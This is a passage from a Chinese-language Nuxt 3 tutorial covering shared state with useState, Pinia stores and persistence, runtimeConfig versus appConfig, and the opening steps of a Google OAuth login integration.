0，當前端Hydration 步驟載入 Vue 或跳轉頁面，因為使用相同的 key 所以這個狀態也會繼續被保留，直至我們下一次重新整理網頁。\nuseState 的共享狀態 前面 useState 的基本用法以 counter 當作 key，我們可以再建立不同的頁面元件並使用 useState('counter') 就可以把這個狀態拿做出來用，也就達到了在任何元件中可以共享相同的響應式狀態。\n新增 ./pages/counter/surprise.vue，內容如下：\npages/counter/surprise.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;text-9xl font-semibold text-sky-600\u0026#34;\u0026gt;{{ counter }}\u0026lt;/span\u0026gt; \u0026lt;div class=\u0026#34;mt-8 flex flex-row\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;font-base mx-2 rounded-full bg-sky-500 px-4 py-2 text-xl text-white hover:bg-sky-600 focus:outline-none focus:ring-2 focus:ring-sky-400 focus:ring-offset-2\u0026#34; @click=\u0026#34;counter++\u0026#34; \u0026gt; 增加 \u0026lt;/button\u0026gt; \u0026lt;button class=\u0026#34;font-base mx-2 rounded-full bg-sky-500 px-4 py-2 text-xl text-white hover:bg-sky-600 focus:outline-none focus:ring-2 focus:ring-sky-400 focus:ring-offset-2\u0026#34; @click=\u0026#34;counter--\u0026#34; \u0026gt; 減少 \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-slate-500\u0026#34;\u0026gt;如果是第一次進入這個頁面，數值初始設定為亂數\u0026lt;/p\u0026gt; \u0026lt;div class=\u0026#34;mt-8\u0026#34;\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/\u0026#34;\u0026gt;回首頁\u0026lt;/NuxtLink\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const counter = useState(\u0026#39;counter\u0026#39;, () =\u0026gt; Math.round(Math.random() * 1000)) \u0026lt;/script\u0026gt; 我們可以任意導航至 /counter/increment 與 /counter/surprise 頁面，可以發現兩個頁面可以共享相同的 counter 狀態，當首次進入或重新整理 increment.vue 頁面，會將 counter 初始化為 0；而首次進入或重新整理 surprise.vue 頁面則是產生一個亂數給予 counter。\n當然你也可以直接在其他元件中使用 useState('counter')，就可以取得共享的響應式裝態，但如果這個元件是初次進入而沒有預設值的建立函數，可能會引發一些錯誤，要特別的注意。\n使用組合式函數建立共享狀態 如下例子，我們可以建立組合式函數 (Composables) 來搭配 useState。\n新增 ./composables/states.ts，內容如下：\ncomposables/states.ts 1 export const useColor = () =\u0026gt; useState\u0026lt;string\u0026gt;(\u0026#39;color\u0026#39;, () =\u0026gt; \u0026#39;green\u0026#39;) 新增 ./pages/color.vue，內容如下：\npages/color.vue 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;text-9xl font-semibold text-emerald-400\u0026#34;\u0026gt;{{ color }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const color = useColor() \u0026lt;/script\u0026gt; 如此一來我們定義好的組合式函數就可以被自動的導入及建立具有類型安全的狀態，在各個元件之間就可以呼叫這個組合函數來取得共享狀態。\n在通用渲染的模式之下，瀏覽器於 Hydration 完成前，網頁雖然能瀏覽但是尚不具有互動性，直至 Hydration 完成後，Vue 的頁面元件會重新載入與綁定，因此我們對於響應式的變數，儘量使用 useState 來替代 ref 以確保 Hydration 前後的初始值得以被保留，而且 useState 因為可以使用 key 來使狀態於元件間共享。\n狀態管理 - Store \u0026amp; Pinia 上述我們介紹了如何在 Nuxt 3 使用 useState 來建立一個元件間的共享狀態，隨著專案的健壯增大，我們就需要一個更好的方式來管理與儲存這些狀態，例如在 Vue 中使用 Vuex 或 Pinia 來建立一個 Store 管理這些狀態就是一個解決方案。如果你還不了解 Pinia，可以理解為是 Vuex v5。因為目前 Pinia 已經成為 Vue 官方推薦的狀態管理解決方案，本篇將針對 Nuxt 使用 Pinia 做一個簡單的介紹。\nPinia 如果你使用過 Vuex 大概會知道 Vue 如何建立 Store 來做狀態管理，隨著時間 Vuex 很積極的蒐集社群及使用者的意見來規劃 Vuex v5。Pinia 的作者 Eduardo 是 Vue.js 核心團隊的成員之一，也參與著 Vuex 的開發，當時他正測試著 Vuex v5 的提案，而 Pinia 成為探索這些意見及可能性的先驅，實現了 Vuex v5 可能的樣子，現在 Pinia 的 API 已經進入穩定狀態，也成為 Vue 官方推薦使用的狀態管理解決方案，並遵循著 Vue 生態的 RFC 流程。\nPinia 相較於 Vuex 有以下差異：\n沒有 mutation，只需要使用 action 就可以改狀態。 不再有 modules 巢狀的結構，也不再需要為模組定義命名空間，因為在 Pinia 中，可以定義多個 Store 而且每個都是獨立的也都具有自己的命名空間。 更完整的支援 TypeSctipt，也不再需要使用多餘的 types 來封裝，所有的內容都是類型化的，Pinia API 的設計方式盡可能使用 TypeSctipt 類型推斷。 非常輕巧，約僅有 1 KB，而且可以自定義插件。 支援伺服器端渲染 (SSR) 與程式碼自動拆分。 Nuxt 3 安裝 Pinia 1 2 3 npm install -D pinia @pinia/nuxt --force # or # yarn add -D pinia @pinia/nuxt --force 目前照著官方安裝 Pinia，會發生一些問題，所以我們在安裝時加上 \u0026ndash;force 參數\n添加 @pinia/nuxt 至 nuxt.config.ts 的 modules 屬性中。\nnuxt.config.ts 1 2 3 export default defineNuxtConfig({ modules: [\u0026#39;@pinia/nuxt\u0026#39;] }) 建立第一個 Pinia 的 Store Pinia 提供了一個函數 defineStore 用來定義 store，呼叫時需要一個唯一的名稱來當作第一個參數傳遞，也稱之為 id，Pinia 會使用它來將 store 連接到 devtools。\n建議將回傳的函數命名為 use...，例如 useCounterStore，use 作為開頭是組合式函數命名的約定，來符合使用上的習慣。\n而 defineStore 的第二個參數，可以傳入 Options 物件或是 Setup 函數，例如我們使用 Options 來定義一個 Store，新增 ./stores/counter.js，內容如下：\nstores/counter.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import { defineStore } from \u0026#39;pinia\u0026#39; export const useCounterStore = defineStore(\u0026#39;counter\u0026#39;, { state: () =\u0026gt; ({ count: 0 }), actions: { increment() { this.count += 1 }, decrement() { this.count -= 1 } }, getters: { doubleCount: (state) =\u0026gt; state.count * 2 } }) 可以發現到與 Vue 的 Options API 非常類似，我們可以傳遞帶有 state、actions 和 getters 屬性的物件。這些屬性正好讓 Store 與 Options API 呼應彼此的關係，如 state 對應 data、actions 對應 methods 而 getters 對應 computed。\n還有另一種方式可以來定義 Store，與 Vue Composition API 的 setup 函數類似，我們可以傳入一個函數，這個函數裡面定義響應式屬性、方法等函數，最後回傳我們想公開的屬性和方法所組成的物件。\n以 setup 函數定義 counter store，內容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import { defineStore } from \u0026#39;pinia\u0026#39; export const useCounterStore = defineStore(\u0026#39;counter\u0026#39;, () =\u0026gt; { const count = ref(0) const increment = () =\u0026gt; { count.value += 1 } const decrement = () =\u0026gt; { count.value -= 1 } const doubleCount = computed(() =\u0026gt; count.value * 2) return { count, increment, decrement, doubleCount } }) 開始使用 Store 我們只需要在元件中，如下程式碼匯入並呼叫 useCounterStore() 就可以操作 store 裡面的方法或屬性囉！\n1 2 3 import { useCounterStore } from \u0026#39;@/stores/counter\u0026#39; const counterStore = useCounterStore() 我們新增一個頁面元件 ./pages/counter.vue，內容如下：\npages/counter.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;text-9xl font-semibold text-sky-600\u0026#34;\u0026gt;{{ counterStore.count }}\u0026lt;/span\u0026gt; \u0026lt;div class=\u0026#34;mt-8 flex flex-row\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;font-base mx-2 rounded-full bg-sky-500 px-4 py-2 text-xl text-white hover:bg-sky-600 focus:outline-none focus:ring-2 focus:ring-sky-400 focus:ring-offset-2\u0026#34; @click=\u0026#34;counterStore.increment\u0026#34; \u0026gt; 增加 \u0026lt;/button\u0026gt; \u0026lt;button class=\u0026#34;font-base mx-2 rounded-full bg-sky-500 px-4 py-2 text-xl text-white hover:bg-sky-600 focus:outline-none focus:ring-2 focus:ring-sky-400 focus:ring-offset-2\u0026#34; @click=\u0026#34;counterStore.decrement\u0026#34; \u0026gt; 減少 \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mt-8\u0026#34;\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/\u0026#34;\u0026gt;回首頁\u0026lt;/NuxtLink\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { useCounterStore } from \u0026#39;@/stores/counter\u0026#39; const counterStore = useCounterStore() \u0026lt;/script\u0026gt; 這樣我們就完成了一個 store 的顯示狀態值，透過呼叫 counterStore 內定義的 increment 與 decrement 來改變狀態。\n在不同的元件間，你也可以使用 useCounterStore 取得已經建立好的 store 來共享這些狀態或進行操作。\nPinia Store 的 State 預設情況下，可以直接對 store 的實例來取得狀態，而使用 Pinia 定義的 store 比較特別的是，我們可以不用透過呼叫函數來修改狀態，也可以直接對 store 的狀態進行修改。\n1 2 3 const counterStore = useCounterStore() counterStore.count += 10 改變狀態 除了直接使用 counterStore.count += 10 修改 store，你也可以使用 store 提供的 helper $patch 來修改部分的狀態。\n1 2 3 4 userStore.$patch({ name: \u0026#39;Ryan\u0026#39; money: \u0026#39;88888888\u0026#39;, }) 對於集合類型的修改，例如陣列的新增、刪除或指定修改某一個元素等操作，你可以使用 $patch 傳入一個函數，這個函數會接收一個 state 讓你可以修改，對於比較複雜的操作會很方便。\n1 2 3 4 cartStore.$patch((state) =\u0026gt; { state.items.push({ name: \u0026#39;shoes\u0026#39;, quantity: 1 }) state.hasChanged = true }) 如果你需要，也可以將 store 的整個 state 重新設置成一個新的物件。\n1 2 3 4 cartStore.$state = { items: [], hasChanged: false, } 重置狀態 store 的實例提供了一個 $reset() 的 helper，呼叫它就可以將 store 的狀態重置至初始值，不過目前只在使用 Option 物件定義的 store 才有實作。\n1 2 3 const counterStore = useCounterStore() counterStore.$reset() Pinia Store 的 Getters 使用同一個 store 中的其他 getter 在 store 內你可以組合多個 getter，在 Option 物件下，可以透過使用 this 來呼叫使用其他的 getter。\n1 2 3 4 5 6 7 8 9 10 11 export const useStore = defineStore(\u0026#39;main\u0026#39;, { state: () =\u0026gt; ({ counter: 0, }), getters: { doubleCount: (state) =\u0026gt; state.counter * 2, doubleCountPlusOne() { return this.doubleCount + 1 }, } }) 使用其他 store 的 getter 在 store 內你也可以組合其他 store 的 getter，只要建立出其他 store 實例就可以呼叫使用了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 import { useOtherStore } from \u0026#39;./other-store\u0026#39; export const useStore = defineStore(\u0026#39;main\u0026#39;, { state: () =\u0026gt; ({ // ... }), getters: { otherGetter(state) { const otherStore = useOtherStore() return state.localData + otherStore.data }, }, }) Pinia Store 的 Actions Actions 相當於元件中的方法，也是修改狀態的商業邏輯定義的位置，action 可以是同步也可以是異步的，因此，我們也能在 action 中打後端 API 來取得資料後更新狀態。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import { defineStore } from \u0026#39;pinia\u0026#39; export const useUserStore = defineStore(\u0026#39;user\u0026#39;, { state: () =\u0026gt; ({ profile: { name: \u0026#39;\u0026#39;, gender: \u0026#39;\u0026#39;, email: \u0026#39;\u0026#39; } }), actions: { async getUserProfile() { try { const { data } = await useFetch(\u0026#39;/api/profile\u0026#39;) this.profile = data } catch (error) { return error } } } }) Store 的解構 有些情況，你可能需要將 Store 中的屬性或方法獨立的提取出來，但為了保持屬性的響應性，你需要使用 storeToRefs 來建立屬性的參考，就像使用 toRefs 來建立 props 的參考一樣。\n1 2 3 4 5 6 7 import { storeToRefs } from \u0026#39;pinia\u0026#39; import { useCounterStore } from \u0026#39;@/stores/counter\u0026#39; const counterStore = useCounterStore() const { count } = storeToRefs(counterStore) const { increment, decrement } = counterStore Pinia 持久化插件 - Pinia Plugin Persistedstate Pinia 是個非常輕量的狀態管理解決方案，而且也提供底層 API 使得 Pinia 能夠自定義插件來擴展功能，舉例來說，我們有些狀態需要儲存在使用者瀏覽器中，下次再瀏覽時可以取的當時儲存的狀態資料，我們就需要將 store 的狀態持久化。\n我們可以使用 Pinia Plugin Persistedstate 這個插件，來做到持久化這件事，這對於儲存使用者資訊或登入狀態非常的方便。\n在 Nuxt 3 中配置使用 Pinia Plugin Persistedstate Step 1. 安裝套件 1 2 3 npm install -D pinia-plugin-persistedstate --force # or # yarn add -D pinia-plugin-persistedstate --force 目前照著官方安裝 Pinia，會發生一些問題，所以我們在安裝時加上 \u0026ndash;force 參數\nStep 2. 在 Nuxt 3 為 Pinia 添加 Persist 插件 建立 ./plugins/pinia-plugin-persistedstate.client.js，內容如下：\nplugins/pinia-plugin-persistedstate.client.js 1 2 3 4 5 import piniaPersistedstate from \u0026#39;pinia-plugin-persistedstate\u0026#39; export default defineNuxtPlugin((nuxtApp) =\u0026gt; { nuxtApp.$pinia.use(piniaPersistedstate) }) Step 3. 為你的 Store 添加持久化配置 在現有的 store 定義中添加，persist 屬性，來配置 store 持久化，將狀態儲存在瀏覽器的 localStorage。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import { defineStore } from \u0026#39;pinia\u0026#39; export const useCounterStore = defineStore(\u0026#39;counter\u0026#39;, { state: () =\u0026gt; ({ count: 0 }), actions: { increment() { this.count += 1 }, decrement() { this.count -= 1 } }, getters: { doubleCount: (state) =\u0026gt; state.count * 2 }, persist: { enabled: true, strategies: [ { key: \u0026#39;counter\u0026#39;, storage: process.client ? localStorage : null } ] } }) 如果是使用 setup 函數定義 store，你可以在 defineStore 傳入第三個參數並添加 persist 屬性。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 import { defineStore } from \u0026#39;pinia\u0026#39; export const useCounterStore = defineStore( \u0026#39;counter\u0026#39;, () =\u0026gt; { const count = useState(\u0026#39;count\u0026#39;, () =\u0026gt; 0) const increment = () =\u0026gt; { count.value += 1 } const decrement = () =\u0026gt; { count.value -= 1 } const doubleCount = computed(() =\u0026gt; count.value * 2) return { count, increment, decrement, doubleCount } }, { persist: { enabled: true, strategies: [ { key: \u0026#39;counter\u0026#39;, storage: process.client ? localStorage : null } ] } } ) Step 4. 持久化效果 當我們設置好 counterStore 的持久化後，我們的狀態就會被儲存在瀏覽器的 localStorage 之中，就算關閉瀏覽器或重新整理網頁，store 的狀態都會再從 localStorage 讀取出來。\n在小型的專案中，你可以使用 useState 來管理，但大專案你就需要一個更好的方式來管理這些狀態，如 Pinia 來為我們管理這些狀態，甚至定義多個 store，Pinia 支援的插件能協助我們擴展 Pinia 的功能，Pinia Plugin Persistedstate 就是一個很常用的插件，能協助我們將 Pinia 的狀態持久化至瀏覽器的 localStorage 或 sessionStorage 中。\nRuntime Config \u0026amp; App Config 在 Nuxt 3 中提供了兩種可以方式設定環境變數或前端需要使用的共用設定，分別是在 Nuxt 啟動時會在後端載入使用的 Runtime Config 及可以在前端被使用的 App Config 這兩者間的區別這邊做一些講解。\nRuntime Config 在開發網站或部署時，我們總是有一些環境變數需要做設置，dotenv 就是一個很好用的套件，能幫助我們將專案下的 .env 檔案載入到 Node.js 的 process.env 之中，尤其在後端伺服器的 API 開發，這些不能公開或敏感的 Key 或設定值，通常不會與整個專案一起進行版本控制，而是針對不同環境與機器，配置於 .env 或環境變數之中。\n這個 .env 設定檔內的環境變數，例如：資料庫的帳號密碼、第三方服務的 Token 或 API Key \u0026hellip;等，通常只會在伺服器被讀取做使用，也不會洩漏這些設定給使用者知道，我們也稱之為執行時的設定 (Runtime Config)。\nNuxt 3 提供了可以設定 Runtime Config 的方式，我們可以很方便的來設定這些環境變數給予伺服器執行時使用。\n配置 runtimeConfig 我們可以在 nuxt.config.ts 中添加 runtimeConfig 屬性，就可以來設定只有伺服器端可以使用的環境變數。\n例如，在 nuxt.config.ts 檔案中，添加一個 apiSecret 至 runtimeConfig 屬性內：\nnuxt.config.ts 1 2 3 4 5 export default defineNuxtConfig({ runtimeConfig: { apiSecret: \u0026#39;怎麼可以讓你知道呢 :P\u0026#39; } }) 我們就可以在 Server API 使用 useRuntimeConfig() 獲得執行時的設定，再從中取得 apiSecret 環境變數。\n1 2 3 4 5 6 7 8 9 10 const runtimeConfig = useRuntimeConfig() export default defineEventHandler((event) =\u0026gt; { const { apiSecret } = runtimeConfig console.log(`接收到了一個 Server API 請求: ${event.req.url}`) console.log(`執行時的環境變數 [apiSecret]: ${apiSecret}`) return \u0026#39;ok\u0026#39; }) 因為我們是定義在 Server API，所以可以在測試伺服器啟動的 Terminal 看見 console.log 的結果。\n此外你也可以在插件或 Vue 中使用 useRuntimeConfig() 來取得執行時的設置，但也僅在 setup 或 Nuxt Lifecycle Hooks 中有效。\n客戶端使用 runtimeConfig 通常一些密鑰或敏感資訊，我們都會定義在 runtimeConfig 僅供伺服器端做使用，而 runtimeConfig 也可以配置一個 public 的屬性，來把一些環境變數於伺服器端或客戶端做使用，例如，API 的 Base URL 這類在伺服器端打 API 時會需要使用，而客戶端的操作流程也會打同樣的 API 位置，我們就可以使用 public 的屬性。\n例如，在 nuxt.config.ts 檔案中，添加一個 apiBase 至 runtimeConfig.public 屬性內：\nnuxt.config.ts 1 2 3 4 5 6 7 8 export default defineNuxtConfig({ runtimeConfig: { apiSecret: \u0026#39;怎麼可以讓你知道呢 :P\u0026#39;, public: { apiBase: \u0026#39;/api\u0026#39; } } }) 新增 ./pages/profile.vue 頁面：\npages/profile.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;my-24 flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;mt-4 text-2xl text-gray-600\u0026#34;\u0026gt;回傳資料:\u0026lt;/span\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-3xl font-semibold text-blue-500\u0026#34;\u0026gt;{{ data }}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const runtimeConfig = useRuntimeConfig() const { apiBase } = runtimeConfig.public console.log(toRaw(runtimeConfig)) const { data } = await useFetch(`${apiBase}/hello`) \u0026lt;/script\u0026gt; 添加在 runtimeConfig.public 屬性的環境變數，在伺服器端與客戶端都可以讀取得到。\n下圖中可以發現，在瀏覽器中的 Console 所印出的 runtimeConfig 是不會包含僅有在伺服器端能使用的 apiSecret。\n使用 .env 建立環境變數 Nuxt 在開發模式或執行時，已經有內建 dotenv，如果在專案目錄下添加了 .env，Nuxt 會在開發期間、建構時或產生靜態網站時，自動載入 .env 內的環境變數。\n例如建立 .env 檔案，內容如下：\n.env 1 2 NUXT_API_SECRET=api_secret_token NUXT_PUBLIC_API_BASE=https://nuxtjs.org 這兩個值，將被 dotenv 自動載入至 process.env 中，作為環境變數。\n環境變數的覆蓋 不論是透過 dotenv 自動載入 .env 或其他方式配置的環境變數，只要環境變數命名是 NUXT_ 開頭，這個環境變數將會覆蓋 runtimeConfig 的設置。\n舉例來說，當我們 runtimeConfig 設置如下：\n1 2 3 4 5 6 7 8 export default defineNuxtConfig({ runtimeConfig: { apiSecret: \u0026#39;怎麼可以讓你知道呢 :P\u0026#39;, public: { apiBase: \u0026#39;/api\u0026#39; } } }) 建立 .env 檔案或其他方式設置下列環境變數：\n1 2 NUXT_API_SECRET=api_secret_token NUXT_PUBLIC_API_BASE=https://nuxtjs.org 那麼 NUXT_API_SECRET 環境變數，將會覆蓋 runtimeConfig.apiSecret，而 NUXT_PUBLIC_API_BASE 將會覆蓋 runtimeConfig.public.apiBase，最終 runtimeConfig 的設定會變成如下：\n1 2 3 4 5 6 { apiSecret: \u0026#34;api_secret_token\u0026#34;, // 被 NUXT_API_SECRET 環境變數覆蓋 public: { apiBase: \u0026#34;https://nuxtjs.org\u0026#34; // 被 NUXT_PUBLIC_API_BASE 環境變數覆蓋 } } 會有這樣子的特性是因為 Nuxt 會在啟動時，先載入 nuxt.conf.ts 內的 runtimeConfig，建立出呼叫 useRuntimeConfig() 所得到的執行時設定，例如，先建構出了 _runtimeConfig 物件。\n1 2 3 4 5 6 const _runtimeConfig = { apiSecret: \u0026#39;怎麼可以讓你知道呢 :P\u0026#39;, public: { apiBase: \u0026#39;/api\u0026#39; } } 接著會走訪這個 _runtimeConfig 物件裡面的 key，逐一將 key 的名稱轉換蛇形命名法 (Snake case)，並轉成全大寫再加上 NUXT_ 前綴後取得對應的環境變數，如果存在就會以新值來覆蓋 _runtimeConfig 內的屬性。\n例如 apiSecret 經過轉換變成 api_secret，接著轉大寫 API_SECRET 最後加上前綴變成 NUXT_API_SECRET，如此環境變數 NUXT_API_SECRET 的值就覆蓋 runtimeConfig.apiSecret。\n而在 public 下的設置，也會先轉為 public_apiBase 再經過蛇行命名成 public_api_base 等步驟，最後變成 NUXT_PUBLIC_API_BASE 來載入環境變數並覆蓋。\n最後小提醒，當建構出生產環境的網站，如 .output 目錄後，dotenv 並不會包含在建構的網站內， 你需要再自己載入或配置環境變數才能正常運作哦，例如在 PM2 配置 env。\nApp Config 配置 appConfig 在 nuxt.config.ts 檔案中，可以在 appConfig 屬性內添加設置，例如，通常我們會添加像網站主題的主色等這類可以公開的配置，讓網站可以使用這個設置。\n1 2 3 4 5 6 7 export default defineNuxtConfig({ appConfig: { theme: { primaryColor: \u0026#39;#0ea5e9\u0026#39; } } }) 當建立好 appConfig 後，就可以使用組合式函數 useAppConfig() 來取得設置。\n例如，建立 ./pages/config.vue，內容如下：\npages/config.vue 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;my-24 flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;mt-4 text-2xl text-gray-600\u0026#34;\u0026gt;theme.primaryColor:\u0026lt;/span\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-3xl font-semibold text-blue-500\u0026#34;\u0026gt;{{ theme.primaryColor }}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const appConfig = useAppConfig() const { theme } = appConfig \u0026lt;/script\u0026gt; app.config 檔案 你也可以在專案目錄下建立 app.config.ts 來配置 App Config，這個檔案的副檔名可以是 .ts、.js 或 .mjs。\napp.config.ts 1 2 3 4 5 export default defineAppConfig({ theme: { primaryColor: \u0026#39;#3b82f6\u0026#39; } }) 當建立了 app.config.ts 檔案，該設定會與 nuxt.config.ts 檔案中的 appConfig 屬性結合，如果具有相同的命名，則以 app.config.ts 檔案內的設置為主。\n具有響應式的設定 當設定好的 App Config 在使用時，解構出的變數是具有響應性的，也就是說在其他頁面修改主題顏色的設定，可以響應至所有使用這個設定的元件。\n舉個例子，新增一個 darkMode 的屬性至 app.config.ts 檔案內的 theme：\napp.config.ts 1 2 3 4 5 6 export default defineAppConfig({ theme: { primaryColor: \u0026#39;#3b82f6\u0026#39;, darkMode: false } }) 建立 ./pages/index.vue，內容如下：\npages/index.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-gray-800\u0026#34;\u0026gt;這裡是首頁\u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;my-4 flex flex-col space-y-4\u0026#34;\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/config\u0026#34;\u0026gt;前往 /config\u0026lt;/NuxtLink\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-2xl text-gray-600\u0026#34;\u0026gt;theme.darkMode:\u0026lt;/p\u0026gt; \u0026lt;span class=\u0026#34;mt-4 text-3xl font-semibold text-blue-500\u0026#34;\u0026gt;{{ theme.darkMode }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const appConfig = useAppConfig() const { theme } = appConfig \u0026lt;/script\u0026gt; 建立 ./pages/config.vue，內容如下：\npages/config.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;my-24 flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-2xl text-gray-600\u0026#34;\u0026gt;theme.primaryColor:\u0026lt;/p\u0026gt; \u0026lt;span class=\u0026#34;mt-4 text-3xl font-semibold text-blue-500\u0026#34;\u0026gt;{{ theme.primaryColor }}\u0026lt;/span\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-2xl text-gray-600\u0026#34;\u0026gt;theme.darkMode:\u0026lt;/p\u0026gt; \u0026lt;span class=\u0026#34;mt-4 text-3xl font-semibold text-blue-500\u0026#34;\u0026gt;{{ theme.darkMode }}\u0026lt;/span\u0026gt; \u0026lt;button class=\u0026#34;mt-6 rounded-sm bg-blue-500 py-2 px-4 text-base font-medium text-white hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:ring-offset-2\u0026#34; @click=\u0026#34;theme.darkMode = !theme.darkMode\u0026#34; \u0026gt; {{ `${theme.darkMode ? \u0026#39;取消\u0026#39; : \u0026#39;啟用\u0026#39;}深色模式` }} \u0026lt;/button\u0026gt; \u0026lt;div class=\u0026#34;mt-8\u0026#34;\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/\u0026#34;\u0026gt;回首頁\u0026lt;/NuxtLink\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const appConfig = useAppConfig() const { theme } = appConfig \u0026lt;/script\u0026gt; 如下圖，我們的首頁取得了 App Config 中的 theme.darkMode 預設為 false，接著我們切換至 /config 頁面，可以將從 useAppConfig() 解構出的 theme 進行變更，我們使用按鈕來設置 theme.darkMode 為 true 或 false 表示啟用或取消深色模式。當變更完成後，回至首頁，可以發現 theme.darkMode 發生了響應。\n小結 Nuxt 3 提供了 Runtime Config 及 App Config 來讓我們將常用或預設設定應用在不同的情境，使用時，我們僅需記得，不能公開的金鑰或敏感訊息，僅放置在 runtimeConfig 中而且不在 public 屬性內，runtimeConfig.public 通常放的是前後端會使用到且不常修改的常數。而 App Config 則是當伺服器端與客戶端需要使用的設置，如主題顏色、是否啟用深色模式等這類可以被使用者調整變動的且需要具有響應性，就可以放置在 appConfig 之中。\n實作練習 這裡介紹網站的會員系統常會使用到第三方登入，將以 Google OAuth 為例來實際於 Nuxt 3 中做串接。\n串接 Google OAuth 登入 首先，我們需要有一組 Google OAuth 使用的 Client ID，你可以到 Google Console 新增一個「OAuth 2.0 用戶端 ID」，這裡我就不再贅述網頁應用程式用的申請過程。\n這邊小提醒一下，在建立 OAuth Client ID 時，已授權的 JavaScript 來源，記得填寫上您的正式環境或開發環境的 Domain，且建議使用 HTTPS。\n完成後，記得保管好用戶端密碼、用戶端 ID (Client ID) 是我們稍後會需要的，用戶端編號格式大概如：\n1 168152363730-b37gnijdpa2rdvvbq0qc29cjh4082t3b.apps.googleusercontent.com 我們將這組 Client ID，放置在 Nuxt 的 Runtime Config 之中。調整 nuxt.config.ts 內容，在 runtimeConfig.public 添加 googleClientId。\nnuxt.config.ts 1 2 3 4 5 6 7 export default defineNuxtConfig({ runtimeConfig: { public: { googleClientId: \u0026#39;這邊放上你的 Google Client ID\u0026#39; } } }) 接下來，安裝 Vue 的 Google OAuth 插件，這邊使用的是 vue3-google-login，也有詳細的說明文件可以參考。\n安裝 vue3-google-login\n1 2 3 npm install -D vue3-google-login # or # yarn add -D vue3-google-login 建立 Nuxt 3 插件來使用 vue3-google-login，新增 ./plugins/vue3-google-login.client.js，內容如下：\nplugins/vue3-google-login.client.js 1 2 3 4 5 6 7 8 9 10 import vue3GoogleLogin from \u0026#39;vue3-google-login\u0026#39; export default defineNuxtPlugin((nuxtApp) =\u0026gt; { const runtimeConfig = useRuntimeConfig() const { googleClientId: GOOGLE_CLIENT_ID } = runtimeConfig.public nuxtApp.vueApp.use(vue3GoogleLogin, { clientId: GOOGLE_CLIENT_ID }) }) 接著我們在元件中可以直接使用 \u0026lt;GoogleLogin\u0026gt; 元件，並添加一個 callback 屬性；此外，我使用了 Nuxt 3 提供的 \u0026lt;ClientOnly\u0026gt; 元件，將 \u0026lt;GoogleLogin\u0026gt; 